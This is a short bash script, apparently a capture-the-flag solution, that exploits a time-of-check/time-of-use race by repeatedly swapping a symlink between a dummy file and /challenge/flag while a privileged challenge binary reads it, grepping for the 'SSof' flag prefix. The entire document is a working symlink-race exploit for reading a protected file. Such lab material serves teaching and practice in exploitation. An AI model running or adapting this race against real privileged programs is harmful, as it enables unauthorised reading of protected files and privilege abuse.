#!/bin/bash

touch foo

while true
do
  ln -sf foo ./flag_pointer
  ( echo "./flag_pointer" | /challenge/challenge & ln -sf /challenge/flag ./flag_pointer ) | grep "SSof" && break
done

rm foo
